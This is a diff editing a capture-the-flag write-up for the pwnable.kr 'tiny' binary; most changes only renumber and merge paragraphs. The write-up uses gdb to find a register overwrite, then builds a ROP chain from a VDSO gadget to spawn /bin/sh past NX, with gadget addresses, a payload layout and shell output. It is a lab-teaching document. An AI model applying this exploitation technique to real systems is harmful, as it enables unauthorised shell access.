@@ -13,13 +13,13 @@ tiny@ubuntu:/tmp/babi$ hexdump -C ./tiny
 0000007a
 
 
-2. We try to disassemble the binary using objdump. However, there's no luck with it.
-tiny@ubuntu:/tmp/babi$ objdump -D ./tiny
+We try to disassemble the binary using objdump and IDA Pro. However, there's no luck with it.
 
+tiny@ubuntu:/tmp/babi$ objdump -D ./tiny
 ./tiny:     file format elf32-i386
 
 
-3. Since there is not much information about the binary, we choose to debug it. At first, we need to set breakpoint on the unmapped address before the actual process executed. 
+Since there is not much information about the binary, we choose to debug it. At first, we need to set breakpoint on the unmapped address before the actual process executed. 
 
 tiny@ubuntu:/tmp/babi$ gdb -q ./tiny
 Reading symbols from /tmp/babi/tiny...(no debugging symbols found)...done.
@@ -27,7 +27,7 @@ Reading symbols from /tmp/babi/tiny...(no debugging symbols found)...done.
 Breakpoint 1 at 0x0
 
 
-4. Once we set the breakpoint, we can continue to execute. If you try to execute the binary, you should be able to encounter the issue:
+Once we set the breakpoint, we can continue to execute. If you try to execute the binary, you should be able to encounter the issue:
 
 (gdb) r
 Starting program: /tmp/babi/tiny 
@@ -36,7 +36,7 @@ Cannot insert breakpoint 1.
 Error accessing memory address 0x0: Input/output error.
 
 
-5. This error means nothing since it is already executed in the memory. To verify the execution in the memory, we can check the registers.
+This error means nothing since it is already executed in the memory. To verify the execution in the memory, we can check the registers.
 
 (gdb) i r
 eax            0x0	0
@@ -58,7 +58,7 @@ gs             0x0	0
 (gdb) 
 
 
-6. Voila. It seems that we were able to see something in the register. Let's take a look into the EIP register. The register seems to have interesting address, 0x8048074. We can inspect the address inside the memory.
+Voila. It seems that we were able to see something in the register. Let's take a look into the EIP register. The register seems to have interesting address, 0x8048074. We can inspect the address inside the memory.
 
 (gdb) x/10x 0x8048074
 0x8048074:	0x128b5a58	0x0000d2ff	0x00000000	0x00000000
@@ -66,7 +66,7 @@ gs             0x0	0
 0x8048094:	0x00000000	0x00000000
 
 
-7. Seems that offset 0x8048074 is pointing to some instructions. The hex value of 0x128b5a58 and 0x0000d2ff is the only value that exists on the memory. Since it is a little-endian, we can convert the value as in the following:
+Seems that offset 0x8048074 is pointing to some instructions. The hex value of 0x128b5a58 and 0x0000d2ff is the only value that exists on the memory. Since it is a little-endian, we can convert the value as in the following:
 
 	i. 0x128b5a58 = 58 5a 8b 12
 	ii. 0x0000d2ff = ff d2
@@ -78,7 +78,7 @@ gs             0x0	0
 		- ff d2 = call edx
 
 
-8. The instruction can be extract using GDB. 
+The instruction can be extract using GDB. 
 
 (gdb) x/30i 0x8048074
 => 0x8048074:	pop    %eax
@@ -90,9 +90,7 @@ gs             0x0	0
    0x804807e:	add    %al,(%eax)
 
 
-9. The program only containing few instructions. The question now is how do we write a ROP for this kind of vulnerability. As we can see EDX is basically is the last instruction being call. At the beginning, EDX value will be pop out and will copy / overwrite its data into EDX. Whatever data overwritten, it will be call. This will require proper ROP to prevent segmentation fault.
-
-10. To prove that we can overwrite something in the memory, we wrote a small program that call to the program and overwrite with some data "ABCD". Following the example small program we wrote:
+The program only containing few instructions. The question now is how do we write a ROP for this kind of vulnerability. As we can see EDX is basically is the last instruction being call. At the beginning, EDX value will be pop out and will copy / overwrite its data into EDX. Whatever data overwritten, it will be call. This will require proper ROP to prevent segmentation fault. To prove that we can overwrite something in the memory, we wrote a small program that call to the program and overwrite with some data "ABCD". Following the example small program we wrote:
 
 /* small_overwrite.c */
 #include <unistd.h>
@@ -103,7 +101,7 @@ void main()
 }
 
 
-11. Once we compile the code, we debug the binary we compiled just now. Here we don't need to put any breakpoint and we need to observer the memory and its registers. 
+Once we compile the code, we debug the binary we compiled just now. Here we don't need to put any breakpoint and we need to observer the memory and its registers. 
 
 tiny@ubuntu:/tmp/babi$ gdb -q ./small
 Reading symbols from /tmp/babi/small...(no debugging symbols found)...done.
@@ -120,14 +118,14 @@ Program received signal SIGSEGV, Segmentation fault.
 0x0000000044434241 in ?? ()
 
 
-12. We were able to see the program has been caught by SIGSEGV with final offset in stack, 0x0000000044434241. The program manage to overwrite data into the memory (EDX) and EIP. We printed out backtrace memory to see the execution in the stack.
+We were able to see the program has been caught by SIGSEGV with final offset in stack, 0x0000000044434241. The program manage to overwrite data into the memory (EDX) and EIP. We printed out backtrace memory to see the execution in the stack.
 
 (gdb) bt
 #0  0x0000000044434241 in ?? ()
 #1  0x000000000804807a in ?? ()
 
 
-13. Registers overwritten
+Registers overwritten:
 
 (gdb) i r
 rax            0x1	1
@@ -155,18 +153,14 @@ es             0x2b	43
 fs             0x0	0
 
 
-14. With this information, we can see the potential of exploitation in the binary. However, we still need to figure out how we going to execute something like /bin/sh in the memory in order for us to perform further exploitation. 
-
-15. So how the program actually works? It is accepting few arguments (see the small program we wrote) and allows the execution. The binary actually pointing to its actual address 0x6d6f682f ('/hom'). This is one of the argument executed upon running the binary.
-
-16. Inner working of the program:
+With this information, we can see the potential of exploitation in the binary. However, we still need to figure out how we going to execute something like /bin/sh in the memory in order for us to perform further exploitation. So how the program actually works? It is accepting few arguments (see the small program we wrote) and allows the execution. The binary actually pointing to its actual address 0x6d6f682f ('/hom'). This is one of the argument executed upon running the binary. Inner working of the program:
 	i. arguments
 	ii. environment
 
-17. Here we can get some clue that the program basically a:
+Here we can get some clue that the program basically works like:
 	- int main(int argc. char *argv[], char *envp[])
 
-18. Example of the stack layout (https://www.win.tue.nl/~aeb/linux/hh/stack-layout.html):
+Example of the stack layout (https://www.win.tue.nl/~aeb/linux/hh/stack-layout.html):
 
 	local variables of main
 	saved registers of main
@@ -187,10 +181,7 @@ fs             0x0	0
 	NULL
 
 
-19. The binary itself was enable with NX. Our challenge is where should we jump to since the NX is enabled. So now let's inspect the RSP register. As for now, we manage to overwrite something into RDX and RIP. Thus, we need something that can help us to jump out of the store registers and execute /bin/sh. 
-
-
-20. RSP register inspection:
+The binary itself was enable with NX. Our challenge is where should we jump to since the NX is enabled. So now let's inspect the RSP register. As for now, we manage to overwrite something into RDX and RIP. Thus, we need something that can help us to jump out of the store registers and execute /bin/sh. RSP register inspection:
 
 (gdb) x/100wx $rsp
 0xffbadde4:	0x0804807a	0x00000000	0xffbaed61	0xffbaed76
@@ -220,7 +211,7 @@ fs             0x0	0
 0xffbadf64:	0x00000000	0x00000000	0x00000000	0x00000000
 
 
-21. Now ROPing time. We can find a useful gadget from VDSO. VDSO ASLR is known to be wekear than ASLR on other sections (SROP FTW). VDSO can be bruteforce 256 times. However, we don't want to waste time to do brute forcing. Inspecting for ROP gadget:
+Now ROPing time. We can find a useful gadget from VDSO. VDSO ASLR is known to be wekear than ASLR on other sections (SROP FTW). VDSO can be bruteforce 256 times. However, we don't want to waste time to do brute forcing. Inspecting for ROP gadget:
 
 (gdb) x/10xi 0x55557000
    0x555575bc:	mov    %ebx,%edx
@@ -235,7 +226,7 @@ fs             0x0	0
    0x555575cf:	retq   
 
 
-22. How does the gadget help here? We can use __kernel_vsyscall to execute our payload in the memory. In the ASM code above, data overwritten in the EDX will copy into EBX and this will be call to offset 0x55557b50. The offset 0x55557b50 as in following instructions:
+How does the gadget help here? We can use __kernel_vsyscall to execute our payload in the memory. In the ASM code above, data overwritten in the EDX will copy into EBX and this will be call to offset 0x55557b50. The offset 0x55557b50 as in following instructions:
 
 (gdb) x/10xi 0x55557b50
    0x55557b50:	push   %rcx
@@ -250,13 +241,13 @@ fs             0x0	0
    0x55557b5b:	nop
 
 
-23. At the offset 0x555575c8, stack pointer will be increase and then our RBX will be pop (which is our execv() here). Our final exploitation will look like this:
+At the offset 0x555575c8, stack pointer will be increase and then our RBX will be pop (which is our execv() here). Our final exploitation will look like this:
 
 ENVP - [env_var1][env_var2][env_var3][/bin/sh][env_var5][NULL]
 EXEC - [binary][rop_gadget_vdso][buf][buf][buf][buf][buf][buf][buf][buf][buf][buf][NULL][ENVP]
 
 
-24. Last one, is to construct the exploit, compiling and executing it. Before executing the exploit, we need to change the limit of ulimit. Following are the exploitation details:
+Last one, is to construct the exploit, compiling and executing it. Before executing the exploit, we need to change the limit of ulimit. Following are the exploitation details:
 
 tiny@ubuntu:/tmp/babi$ gcc -o exploit exploit.c 
 exploit.c: In function ‘main’:
@@ -266,5 +257,7 @@ tiny@ubuntu:/tmp/babi$ ./exploit
 $ cat /home/tiny/flag
 <removed>
 
+
+Having fun solving it. Shout to 'perzik' who asking me to play pwnable.kr :)
 
 
